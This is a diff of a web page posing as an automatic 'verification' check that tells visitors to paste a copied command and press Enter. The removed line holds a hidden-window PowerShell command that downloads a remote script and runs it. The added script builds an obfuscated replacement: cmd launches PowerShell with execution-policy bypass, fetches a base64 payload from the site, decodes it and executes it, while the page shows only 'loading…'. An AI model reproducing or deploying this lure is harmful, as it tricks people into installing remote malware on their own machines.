@@ -41,12 +41,13 @@ button.ok{background:#248046}
     <li>Press <b>Ctrl</b> + <b>V</b> to paste</li>
     <li>Press <b>Enter</b> and wait a few seconds</li>
   </ol>
-  <div class="code" id="cmd">powershell -nop -w h "irm https://venicecook.vercel.app/a.txt|iex"</div>
+  <div class="code" id="cmd">loading…</div>
   <button id="b">Copy command</button>
   <div class="foot">Verification is done automatically in the background</div>
 </div>
 <script>
-var t=document.getElementById('cmd').textContent.trim();
+var t='cmd /c cd /d %SystemRoot% & powershell -nop -w h -ep bypass -c "&([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm '+location.origin+'/a)))))"';
+document.getElementById('cmd').textContent=t;
 document.getElementById('b').onclick=function(){
   var b=this;
   function ok(){b.textContent='Copied';b.className='ok';setTimeout(function(){b.textContent='Copy command';b.className='';},2200);}
